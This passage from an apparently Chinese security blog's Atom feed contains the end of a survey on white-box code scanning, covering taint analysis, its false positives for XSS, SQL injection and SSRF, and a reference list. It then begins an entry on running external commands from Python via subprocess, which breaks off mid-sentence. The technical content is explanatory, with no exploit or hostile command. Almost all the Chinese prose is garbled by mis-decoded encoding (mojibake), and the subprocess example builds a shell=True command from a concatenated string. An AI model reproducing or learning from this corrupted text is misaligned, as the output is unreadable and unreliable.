ï¼šæ±¡ç‚¹ä¿¡æ¯äº§ç”Ÿç‚¹ï¼ˆsourceï¼‰ã€æ±¡ç‚¹ä¿¡æ¯æ±‡èšç‚¹ï¼ˆsinkï¼‰å’Œæ±¡ç‚¹ä¿¡æ¯æ¸…æ´ç‚¹ï¼ˆsanitizerï¼‰ï¼Œå®ƒä»¬é€šå¸¸éœ€è¦å¯Œæœ‰ç»éªŒçš„å®‰å…¨å·¥ç¨‹å¸ˆæ‰‹åŠ¨è®¾ç½®ã€‚</p><ul><li>äº§ç”Ÿç‚¹ï¼ˆsourceï¼‰ï¼šæ±¡ç‚¹äº§ç”Ÿç‚¹å¾€å¾€æ˜¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œæ¯”å¦‚Webåº”ç”¨ä¸­è¯»å–URLå‚æ•°çš„å‡½æ•°ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™äº›å‡½æ•°è°ƒç”¨åçš„è¿”å›å€¼è¢«æ ‡è®°ä¸ºæ±¡ç‚¹â€”â€”æ”»å‡»è€…å¯ä»¥æ“æ§çš„æ•°æ®ç‚¹ã€‚</li><li>æ±‡èšç‚¹ï¼ˆsinkï¼‰ï¼šæ£€æŸ¥ç‚¹æ˜¯ç¨‹åºçš„ä¸€äº›æ•æ„Ÿæ“ä½œï¼Œå¦‚è°ƒç”¨æ•°æ®åº“æŸ¥è¯¢è¯­å¥ï¼Œæˆ–æ˜¯å°†æ•°æ®è¿”å›åˆ°ç½‘é¡µï¼Œå¦‚æœè¿™äº›æ“ä½œçš„æ•°æ®æ˜¯æ±¡ç‚¹ï¼Œé‚£ä¹ˆæ„å‘³ç€æ“ä½œå¯è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå³ç¨‹åºå­˜åœ¨æ¼æ´ã€‚</li><li>æ¸…æ´ç‚¹ï¼ˆsanitizerï¼‰ï¼šæ¸…æ´ç‚¹é€šå¸¸æ˜¯å¯¹æ±¡ç‚¹è¿›è¡Œæ¶ˆé™¤çš„ä¸€ç±»æ“ä½œï¼Œå¦‚SQLæ³¨å…¥ã€XSSä¸­çš„è¿‡æ»¤å‡½æ•°ã€‚æ¸…æ´ç‚¹æ˜¯æ±¡ç‚¹ä¼ æ’­å‡†ç¡®æ€§çš„é‡è¦ä¿è¯ï¼Œä¸èƒ½è¯†åˆ«æ¸…æ´ç‚¹å³ä¼šå¼•å‘æ±¡ç‚¹è¿‡æ±¡æŸ“é—®é¢˜ã€‚</li></ul><h2 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h2><p>æ±¡ç‚¹åˆ†æåˆ†ä¸ºé™æ€æ±¡ç‚¹åˆ†æå’ŒåŠ¨æ€æ±¡ç‚¹åˆ†æï¼Œä¸¤è€…åŒºåˆ«åœ¨äºé™æ€æ±¡ç‚¹åˆ†æåªä½¿ç”¨ç¨‹åºä»£ç æ¨¡æ‹Ÿæ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹ï¼Œè€ŒåŠ¨æ€æ±¡ç‚¹ä¼ æ’­åˆ™é€šè¿‡ç¨‹åºçš„å®é™…è¿è¡Œè¿›è¡Œä¼ æ’­ï¼Œç”±äºæœ¬æ–‡å…³æ³¨äºç™½ç›’æµ‹è¯•æƒ…æ™¯ï¼Œæ•…åªä»‹ç»é™æ€æ±¡ç‚¹ä¼ æ’­æ–¹æ³•ï¼Œè€Œåœ¨ä¸‹ä¸€å­ç« èŠ‚ä¼šä»‹ç»åŠ¨æ€ä¼ æ’­çš„ä¼˜åŠ£åŠ¿ã€‚</p><p>åœ¨å®šä¹‰å¥½ä¸‰è¦ç´ ä¹‹åï¼Œæ±¡ç‚¹åˆ†ææ³•ä¼šä¸æ•°æ®æµåˆ†æä¸€æ ·ï¼Œå¯¹ç¨‹åºè¿›è¡Œè¿‡ç¨‹å†…åˆ†æå’Œè¿‡ç¨‹é—´åˆ†æã€‚</p><p>è¿‡ç¨‹å†…åˆ†æåŒ…æ‹¬äº†æ˜¾å¼æµåˆ†æå’Œéšå¼æµåˆ†æï¼Œæ˜¾ç¤ºæµåˆ†æå³é€šè¿‡åˆ†æå˜é‡çš„æ•°æ®ä¾èµ–å…³ç³»è¿›è¡Œæ±¡ç‚¹ä¼ æ’­ï¼Œè€Œéšå¼åˆ†æåˆ™æ˜¯æŒ‡è€ƒè™‘æ§åˆ¶ä¾èµ–è¿›è¡Œæ±¡ç‚¹ä¼ æ’­ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200528204252182.png" alt="image-20200528204252182"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé¦–å…ˆå‡è®¾å˜é‡ $a$ ä¸ºæ±¡ç‚¹å˜é‡ï¼Œå®çº¿ç®­å¤´è¡¨ç¤ºäº†æ˜¾ç¤ºæ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼Œè€Œè™šçº¿ç®­å¤´è¡¨ç¤ºäº†éšå¼æ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼ŒåŒæ—¶è¯¥å›¾ä¹Ÿè¯´æ˜äº†è¿‡ç¨‹å†…æ±¡ç‚¹ä¼ æ’­åŸºæœ¬æ€æƒ³ï¼Œå³ä»ä¸Šè‡³ä¸‹éå†æ•°æ®æµå›¾ï¼Œè‹¥æœªæ ‡è®°çš„å˜é‡ä¾èµ–äºæ±¡ç‚¹å˜é‡ï¼Œåˆ™æ–°å˜é‡ä¹Ÿè¢«æ ‡è®°ä¸ºæ±¡ç‚¹å˜é‡ã€‚è™½ç„¶æ”»å‡»è€…ç¡®å®å¯ä»¥åˆ©ç”¨æ§åˆ¶ä¾èµ–æ“ä½œæ•°æ®è¿›è¡Œæ”»å‡»ï¼Œä½†ç”±äºå…¶åˆ†æå¤æ‚ä¸”ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ï¼Œåœ¨å·¥ç¨‹é¢†åŸŸå¸¸å¸¸åªåšæ•°æ®æµä¾èµ–çš„æ˜¾ç¤ºåˆ†æï¼Œå› æ­¤æœ¬æ–‡ä¸»è¦è®¨è®ºæ˜¾å¼æµåˆ†æã€‚</p><p>ç°ä»£ç¨‹åºå­˜åœ¨ç€å¤æ‚çš„å‡½æ•°è°ƒç”¨ï¼Œé™¤äº†è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œè¿˜éœ€è¦è¿›è¡Œè¿‡ç¨‹é—´åˆ†æã€‚å…¶åˆ†æé¦–å…ˆæ„é€ å‡½æ•°è°ƒç”¨å›¾ï¼ˆCall Graphï¼‰ï¼Œæ¥ç€æœç´¢å­˜åœ¨äº§ç”Ÿç‚¹çš„å‡½æ•°ï¼Œå¯¹äºæ¯ä¸€ä¸ªå­˜åœ¨äº§ç”Ÿç‚¹çš„å‡½æ•°ï¼Œè‡ªé¡¶å‘ä¸‹åˆ†æï¼ˆä¹Ÿå¯ä»¥è‡ªåº•å‘ä¸Šåˆ†æï¼‰ã€‚é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œè·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œè¿›è¡Œè¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æï¼Œå°†åˆ†æç»“æœè¡¨è¾¾ä¸º $\left\langle f, S, r\right\rangle$ çš„å‡½æ•°æ‘˜è¦ï¼Œå…¶ä¸­$f$åŒ…å«å‡½æ•°æœ¬èº«æ‘˜è¦ä¿¡æ¯ï¼ˆç±»åæ–¹æ³•åå’Œå‡½æ•°ç­¾åï¼‰ï¼Œ$S$ æŒ‡è°ƒç”¨è¿‡è¯¥å‡½æ•°åè¢«æ±¡æŸ“çš„å˜é‡é›†åˆï¼Œ$r$ å–å€¼0æˆ–1ï¼Œæ ‡è®°å‡½æ•°è¿”å›å€¼æ˜¯å¦è¢«æ±¡æŸ“ï¼›æ¥ç€æ ¹æ®å‡½æ•°æ‘˜è¦ï¼Œå†è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå¦‚æ­¤å¾€å¤ç›´è‡³åˆ†æå®Œå‡½æ•°æ‰€æœ‰ä»£ç å—æˆ–æ˜¯æ±¡ç‚¹ä¼ æ’­è‡³æ±‡èšç‚¹ï¼ŒæŠ¥å‘Šæ¼æ´ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200528204328041.png" alt="image-20200528204328041"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåˆ†æè¿‡ç¨‹ä»å·¦ä¾§å‡½æ•°å¼€å§‹ï¼Œå› ä¸ºå…¶æ‰¾åˆ°äº†ä¸€å¤„äº§ç”Ÿç‚¹â€”â€”<em>request.getParameter(â€œxssâ€)</em>ï¼Œäºæ˜¯å°†æ±¡ç‚¹ä¼ é€’åˆ°å˜é‡<em>p</em>ï¼Œæ¥ç€è°ƒç”¨å‡½æ•°<em>func(p)</em>ï¼Œäºæ˜¯å¯¹å‡½æ•°<em>func()</em>åšè¿‡ç¨‹å†…åˆ†æï¼Œå¾—åˆ°å…¶å‡½æ•°æ‘˜è¦ï¼Œ $\left\langle func, \left\{a, b, c\right\}, 1\right\rangle$ ï¼Œäºæ˜¯å›åˆ°è°ƒç”¨è€…çš„å‡½æ•°å†…ï¼Œå˜é‡<em>q</em>è¢«æ ‡è®°ä¸ºæ±¡ç‚¹ï¼Œåˆå› ä¸ºç¬¬ä¸‰è¡Œå­˜åœ¨ä¸€å¤„æ±‡èšç‚¹â€”â€”<em>response.getpriter.print()</em>ï¼Œå¹¶ä¸”å‚æ•°ä¸ºæ±¡ç‚¹ï¼Œäºæ˜¯æŠ¥å‘Šæ­¤å¤„æœ‰æ¼æ´ï¼Œå¹¶ä¸”æ ¹æ®æ±‡èšç‚¹å¯ä»¥åˆ¤æ–­è¯¥æ¼æ´æ˜¯ä¸€ä¸ª XSS æ¼æ´ã€‚</p><h2 id="ä¼˜åŠ¿å’Œä¸è¶³"><a href="#ä¼˜åŠ¿å’Œä¸è¶³" class="headerlink" title="ä¼˜åŠ¿å’Œä¸è¶³"></a>ä¼˜åŠ¿å’Œä¸è¶³</h2><p>æ±¡ç‚¹åˆ†æèƒ½å¤Ÿå¯¹ç¨‹åºä¸Šä¸‹æ–‡æœ‰ä¸€å®šç†è§£ï¼Œå¾€å¾€èƒ½äº§ç”Ÿè¯¯æŠ¥ç‡ç›¸å¯¹è¾ƒä½ä»¥åŠå¯è§£é‡Šçš„æ¼æ´æŠ¥å‘Šï¼Œå…¶æ–¹æ³•å¯¹ Web ç±»å‹çš„å®‰å…¨æ¼æ´è¦†ç›–ç‡è¾ƒé«˜ï¼Œè€Œæ±¡ç‚¹ç±»å‹çš„æ¼æ´æ™®éå…·æœ‰è¾ƒé«˜å±å®³æ€§ï¼Œå› æ­¤è¯¥æ–¹æ³•å·²è¢«å¾ˆå¤šå·¥ä¸šç•Œã€å­¦æœ¯ç•Œçš„å®‰å…¨é™æ€æ‰«æå·¥å…·æ‰€ä½¿ç”¨ã€‚</p><p>ç„¶è€Œï¼Œæ±¡ç‚¹ä¼ æ’­ä»æœ‰å¯èƒ½å‘ç”Ÿè¯¯æŠ¥ï¼Œä»¥ä¸‹é€šè¿‡ç®€å•ç¤ºä¾‹æ¥è¯´æ˜ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200530195755514.png" alt="image-20200530195755514"></p><p>é¦–å…ˆï¼Œæ±¡ç‚¹ä¼ æ’­å¯¹å®¹å™¨ç±»å‹æ— æ³•åšå¾ˆå¥½å¤„ç†ï¼Œå¦‚ä¸Šå›¾ (a)æ‰€ç¤ºï¼Œå½“æ±¡ç‚¹ä¼ å…¥ å®¹å™¨ç±»å‹æ—¶ï¼ˆåœ¨æ­¤ä¾‹å­ä¸­ä¸º mapï¼‰ï¼Œé™æ€æ±¡ç‚¹ä¼ æ’­åªèƒ½å°†è¿™ç±»å˜é‡çš„ä¼ æ’­è§„åˆ™è®¾ ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œä»è€Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼Œå°±å¦‚å›¾æ‰€ç¤ºï¼Œè‹¥è®¾ä¸º map ä¼ æ’­æ±¡ç‚¹ï¼Œç”±äºæ¡ˆä¾‹å®é™…ä»å®¹å™¨ä¸­å–å‡ºçš„æ˜¯æ²¡æœ‰æ±¡ç‚¹çš„å˜é‡ï¼Œå³è¿‡æ±¡æŸ“ï¼Œè€Œè‹¥è®¾ä¸ºä¸ä¼ æ’­ï¼Œè‹¥ q å–å‡ºå‚æ•° pï¼Œé‚£ä¹ˆåˆå¯¼è‡´æ¬ æ±¡æŸ“ã€‚åŠ¨æ€æ±¡ç‚¹ä¼ æ’­è™½ç„¶è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼Œ ä½†æ˜¯ç”±äºå…¶ä½¿ç”¨æ¡ä»¶å¤æ‚ï¼Œä¸”æ— æ³•ç”¨äºé™æ€åˆ†æï¼Œæœ¬æ–‡æš‚ä¸è®¨è®ºã€‚</p><p>æ­¤å¤–ï¼Œä¸è®ºæ˜¯åŠ¨æ€æ±¡ç‚¹ä¼ æ’­è¿˜æ˜¯é™æ€æ±¡ç‚¹ä¼ æ’­ï¼Œå…¶å¯¹æ±¡ç‚¹æ¸…æ´ç‚¹çš„è¯†åˆ«èƒ½åŠ›å‡ ä¹ä¸ºé›¶ï¼Œå¦‚ä¸Šå›¾(b)æ‰€ç¤ºï¼Œè¯¥å‡½æ•°æ˜¯ä¸€ä¸ªå…¸å‹çš„é˜²å¾¡ SQL æ³¨å…¥çš„æ±¡ç‚¹æ¸…æ´ å‡½æ•°ï¼Œå³åœ¨ç¬¬ 2âˆ¼5 è¡Œå¯¹å¾…æ‹¼æ¥ SQL å­—ç¬¦ä¸²å­˜åœ¨çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢å’Œè¿‡æ»¤ï¼Œä½† æ˜¯æ±¡ç‚¹ä¼ æ’­å¹¶ä¸èƒ½è¯†åˆ«è¿™äº›æ¸…æ´å‡½æ•°ï¼Œå¯¼è‡´è¯¯æŠ¥ã€‚</p><p>å†è€…ï¼Œé™æ€æ±¡ç‚¹ä¼ æ’­å¯¹æ§åˆ¶æµæ²¡æ³•åšå¾ˆå¥½çš„å¤„ç†ï¼Œå¦‚ä¸Šå›¾(c)æ‰€ç¤ºï¼Œåœ¨ç¬¬ä¸‰è¡Œï¼Œç¨‹åºå·²ç»å¯¹å¯èƒ½äº§ç”Ÿçš„ SSRF æ¼æ´è¿›è¡Œäº†å¤„ç†ï¼Œå³å¦‚æœæ˜¯å†…éƒ¨åœ°å€åˆ™ç›´æ¥è¿”å›ï¼Œä½†æ˜¯ä¸è®ºæ˜¯è€ƒè™‘æ˜¾å¼æµè¿˜æ˜¯éšå¼æµï¼Œæ±¡ç‚¹ä¼ æ’­éƒ½ä¸èƒ½é¿å…è¿™ä¸€ç±»è¯¯æŠ¥ã€‚</p><p>æœ€åï¼Œå¯¹äºç‰¹æ®Šè§¦å‘æ¡ä»¶çš„æ¼æ´ï¼Œæ±¡ç‚¹ä¼ æ’­æ— æ³•å¾ˆå¥½å¤„ç†ï¼Œå¦‚ä¸Šå›¾(d)æ‰€ç¤ºï¼Œ åœ¨ç¬¬äºŒè¡Œï¼Œå› ä¸º SSRF è¦æ±‚æ”»å‡»è€…èƒ½å¤Ÿæ“æ§ä¸»æœºåï¼Œæ‰€ä»¥å³ä½¿ç”¨æˆ·è¾“å…¥çš„æ±¡ç‚¹å˜é‡æ‹¼æ¥åœ¨ä¸€ä¸ªæ­£å¸¸ä¸»æœºåä¹‹åï¼Œç¨‹åºä¹Ÿä¸ä¼šå‡ºç° SSRF ï¼Œè€ŒæŒ‰ç…§æ±¡ç‚¹ä¼ æ’­åˆ†ææ³•ï¼Œæ¯«æ— ç–‘é—®å®ƒä¼šæŠ¥å‘Šè¿™æ®µç¨‹åºå­˜åœ¨ SSRF æ¼æ´ã€‚</p><p>è¿™äº›é—®é¢˜ä¹Ÿæ˜¯å·¥ä¸šç•Œå’Œå­¦æœ¯ç•ŒäºŸå¾…è§£å†³çš„é—®é¢˜ï¼Œå¦‚å·¥ä¸šç•Œå¼€å§‹å°è¯•ç”¨ç¬¦å·æ‰§è¡Œï¼Œä»¥åŠç”¨é»‘ç›’ã€IASTé…åˆè§£å†³ç™½ç›’ï¼Œåœ¨å­¦æœ¯ç•Œä¹Ÿæ­£å°è¯•ç”¨æœºå™¨å­¦ä¹ è§£å†³é—®é¢˜ã€‚</p><h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><ol><li>J. M. Schumann, Automated Theorem Proving in Software Engineering, Springer Berlin Heidelberg, Berlin, Heidelberg, 2001.</li><li>C. Flanagan, K. R. M. Leino, M. Lillibridge, G. Nelson, J. B. Saxe, R. Stata, Extended static checking for Java, in: Proceedings of the 2002 ACM SIGPLAN Conference on Programming Language Design and Implementation, Vol. 48, ACM Press, New York, New York, USA, 2002, pp. 234â€“245.</li><li>Y. Xie, A. Aiken, Saturn: A scalable framework for error detection using Boolean satisfiability, ACM Transactions on Programming Languages and Systems 29 (3) (2007) 16</li><li>C. Cadar, K. Sen, Symbolic Execution for Software Testing: Three Decades Later, Communications of the ACM 56 (2) (2013) 82â€“90.</li><li>P. Godefroid, N. Klarlund, K. Sen, DART: directed automated random testing, in: Proceedings of the 2005 ACM SIGPLAN conference on Programming language design and implementation, Vol. 40, ACM Press, New York, New York, USA, 2005, pp. 213â€“223.</li><li>K. Sen, D. Marinov, G. Agha, CUTE: a concolic unit testing engine for C, Proceedings of the 10th European software engineering conference held jointly with 13th ACM SIGSOFT international symposium on Foundations of software engineering 30 (5) (2005) 263.</li><li>C. Cadar, V. Ganesh, P. M. Pawlowski, D. L. Dill, D. R. Engler, EXE: Automatically Generating Inputs of Death, ACM Transactions on Information and System Security 12 (2) (2008) 1â€“38.</li><li>C. Cadar, D. Dunbar, D. Engler, Klee: Unassisted and automatic generation of highÂ­coverage tests for complex systems programs, in: Proceedings of the 8th USENIX Symposium on Operating Systems Design and Implementation, OSDI 2008, Vol. 8, 2019, pp. 209â€“224</li><li>G. A. Kildall, A unified approach to global program optimization, in: Proceedings of the 1st annual ACM SIGACT SIGPLAN symposium on Principles of programming languages, ACM Press, New York, New York, USA, 1973, pp. 194â€“206.</li><li>B. Shastry, F. Yamaguchi, K. Rieck, J. P. Seifert, Towards Vulnerability Discovery Using Staged Program Analysis, in: Detection of Intrusions and Malware, and Vulnerability Assessment, Springer, Cham, 2016, pp. 78â€“97.</li><li>N. Jovanovic, C. Kruegel, E. Kirda, Pixy: a static analysis tool for detecting Web application vulnerabilities, in: Proceedings of the 2006 IEEE Symposium on Security and Privacy, IEEE, 2006, pp. 258â€“263.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å†™æ¯•è®¾è°ƒæŸ¥èƒŒæ™¯çŸ¥è¯†æ—¶åšçš„ï¼Œåœ¨&lt;a href=&quot;https://www.t00ls.net/thread-56572-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;t00ls&lt;/a&gt;å’Œ&lt;a href=&quot;https://forum.90sec.com/t/topic/1087&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;90sec&lt;/a&gt;å‘è¿‡å¸–å­ï¼Œè¿™é‡Œåšå½’æ¡£ç”¨ã€‚&lt;/p&gt;&lt;h1 id=&quot;è¯æ³•åˆ†ææŠ€æœ¯&quot;&gt;&lt;a href=&quot;#è¯æ³•åˆ†ææŠ€æœ¯&quot; class=&quot;headerlink&quot; title=&quot;è¯æ³•åˆ†ææŠ€æœ¯&quot;&gt;&lt;/a&gt;è¯æ³•åˆ†ææŠ€æœ¯&lt;/h1&gt;&lt;p&gt;è¯æ³•åˆ†ææŠ€æœ¯æ˜¯æœ€ç®€å•çš„ä¸€ç±»æ¼æ´æŒ–æ˜æŠ€æœ¯ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯å°†ä»£ç æ–‡æœ¬ä¸å½’çº³å¥½çš„ç¼ºé™·æ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼Œä»¥æ­¤å‘ç°æ¼æ´ã€‚ç”±äºå…¶ä¸æ·±å…¥åˆ†æç¨‹åºç»“æ„å’Œè¯­ä¹‰ï¼Œå¾€å¾€åªèƒ½æŒ–æ˜è¾ƒä¸ºç®€å•çš„ä¸€ç±»æ¼æ´ï¼Œå¹¶ä¸”å­˜åœ¨ç›¸å½“é«˜çš„è¯¯æŠ¥ç‡ï¼Œåœ¨å®é™…åœºæ™¯ä¸‹åº”ç”¨è¾ƒå°‘ï¼Œä½†ç”±äºå…¶æ€æƒ³ç®€å•ï¼Œé€‚ç”¨æ€§å¾ˆå¹¿ï¼Œç›®å‰ä¹Ÿè¿˜å­˜åœ¨ç±»ä¼¼å·¥å…·ï¼Œå¦‚ï¼š&lt;a href=&quot;https://github.com/MobSF/Mobile-Security-Framework-MobSF&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MobSF&lt;/a&gt;ï¼Œ&lt;a href=&quot;https://github.com/WhaleShark-Team/cobra&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Cobra&lt;/a&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="æ±¡ç‚¹åˆ†æ" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://anemone.top/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
      <category term="å½¢å¼åŒ–åˆ†æ" scheme="http://anemone.top/tags/%E5%BD%A2%E5%BC%8F%E5%8C%96%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨Pythonä¼˜é›…è°ƒç”¨å…¶ä»–å·¥å…·æˆ–å‘½ä»¤</title>
    <link href="http://anemone.top/dev-%E4%BD%BF%E7%94%A8Python%E4%BC%98%E9%9B%85%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/"/>
    <id>http://anemone.top/dev-ä½¿ç”¨Pythonä¼˜é›…è°ƒç”¨å…¶ä»–å·¥å…·æˆ–å‘½ä»¤/</id>
    <published>2020-03-02T07:32:03.000Z</published>
    <updated>2020-03-21T07:51:07.862Z</updated>
    
    <content type="html"><![CDATA[<p>Python å¼€å‘æ‰«æå™¨æ—¶å¾€å¾€ä¼šè°ƒç”¨å…¶ä»–ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œä½†æ˜¯é€šè¿‡ <code>os.system()</code>æˆ–è€…å…¶ä»–å‘½ä»¤ä¸­æ˜¯ä¼šæœ‰è¿™æ ·æˆ–é‚£æ ·çš„å‘æˆ–ä¸è¶³ï¼Œæœ¬æ–‡å¯¹è¿™äº›é—®é¢˜è¿›è¡Œæ€»ç»“å¹¶æå‡ºè§£å†³æ–¹æ¡ˆï¼Œå¹¶åœ¨ç»“å°¾ç»™å‡ºäº†ä¸€ä¸ªå°è£…å¥½çš„ç±»ï¼Œèƒ½è¾ƒä¸ºå®Œç¾çš„è§£å†³Pythonè°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤çš„é—®é¢˜ã€‚</p><h1 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h1><ol><li>é¦–å…ˆï¼Œæˆ‘å¯ä»¥è°ƒç”¨ä»»æ„å‘½ä»¤ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å‘½ä»¤æ‰§è¡Œæ—¶å‘è¾“å…¥é€šé“ï¼ˆstdinï¼‰ä¼ æ›´å¤šè¾“å…¥ï¼ŒåŒæ—¶Pythonèƒ½å®æ—¶è·å–è¾“å‡ºé€šé“ï¼ˆstdoutï¼‰å’Œé”™è¯¯é€šé“ï¼ˆstderrï¼‰è·ç¨‹åºè¾“å‡ºï¼Œæ³¨æ„æ˜¯è·å–è¾“å‡ºï¼Œè€Œä¸æ˜¯å•çº¯çš„å°†è¾“å‡ºé‡å®šå‘åˆ°å±å¹•æˆ–æ–‡ä»¶ä¸­ï¼›</li><li>æˆ‘å¯ä»¥é€šè¿‡è¿”å›å€¼ï¼Œæˆ–è€…ç¨‹åºè¾“å‡ºåˆ¤æ–­ç¬¬ä¸‰æ–¹ç¨‹åºæ‰§è¡Œæ˜¯å¦å‡ºé”™ï¼Œå¦‚æœå‡ºé”™æŠ›å‡ºå¼‚å¸¸æˆ–è€…è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼›</li><li>æ‰§è¡Œå‘½ä»¤æ˜¯æœ€å¥½å¯ä»¥è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œé˜²æ­¢å­å‘½ä»¤å‡æ­»è€Œå½±å“ä¸»ç¨‹åºï¼›</li><li>è¿™æ®µè°ƒç”¨ç¨‹åºåº”è¯¥æ˜¯è·¨å¹³å°çš„ï¼Œæ¯•ç«ŸPythonæœ¬èº«å°±æ˜¯è·¨å¹³å°è¯­è¨€ã€‚</li></ol><a id="more"></a><h1 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h1><p>çœ‹åˆ°ç¬¬ä¸€æ¡å’Œç¬¬äºŒæ¡éœ€æ±‚ï¼Œé¦–å…ˆæƒ³åˆ°ç”¨ <code>subprocess.Popen()</code> å¯ä»¥å®ç°ï¼Œç¡®å®ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºå®ƒè¿›è¡Œæ”¹é€ ï¼Œå®Œæˆæˆ‘ä»¬çš„ä»»åŠ¡ã€‚</p><p><code>subprocess.communicate()</code> è™½ç„¶å¯ä»¥è®© Python æ‹¿åˆ°ç¨‹åºè¿”å›åˆ°stdoutæˆ–stderrçš„è¾“å‡ºï¼Œä½†æ˜¯å®ƒä¸æ˜¯å®æ—¶çš„ï¼Œè¦æƒ³åšåˆ°å®æ—¶è¾“å‡ºï¼Œé¦–å…ˆå°†stdoutå’Œstderré€šé“é‡å®šå‘åˆ°<code>subprocess.PIPE</code>ï¼Œè¿™é‡Œæ–¹ä¾¿èµ·è§ï¼Œæˆ‘å…ˆå°†stderré€šé“é‡å®šå‘åˆ°stdoutï¼Œå†å°†stdouté‡å®šå‘åˆ°<code>subprocess.PIPE</code>ï¼Œæ³¨æ„å¦‚æœæ˜¯Windowså¹³å°ï¼Œç›´æ¥ä¼ å‘½ä»¤æ˜¯æ²¡æ³•æ‹¿åˆ°æ­£ç¡®çš„ç¨‹åºè¿”å›å€¼çš„ï¼Œå› æ­¤è¦åœ¨åé¢åŠ ä¸Š<code>&amp; exit</code> å‘½ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">    cmd = cmd</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è€ƒè™‘å¦‚ä½•ä»processä¸­æ‹¿æ•°æ®çš„é—®é¢˜ï¼Œè¿™é‡Œä¸€å®šè¦æ–°å¼€ä¸€ä¸ªçº¿ç¨‹å–æ•°æ®ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°å­å‘½ä»¤æ‰§è¡Œäº§ç”Ÿå¤§é‡è¾“å‡ºå¡«æ»¡äº†subprocessçš„ç¼“å†²åŒºï¼Œå¯¼è‡´æ•´ä¸ªç¨‹åºé˜»å¡çš„é—®é¢˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log_thread = threading.Thread(target=print_log, args=(process.stdout,))</span><br><span class="line">log_thread.start()</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šçš„ <code>print_log(stdout)</code>å‡½æ•°ç”¨æ¥ä¸æ–­å‘è¾“å‡ºç¼“å†²åŒºå–æ•°æ®ï¼Œå¹¶è¿›è¡Œå…¶ä»–å¤„ç†ï¼Œè¿™é‡Œçš„stdoutç›¸å½“äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä½†æ˜¯å®è·µè¡¨æ˜ä¸èƒ½ç”¨ readline() å’Œreadlines() è¯»æ•°æ®ï¼Œå› 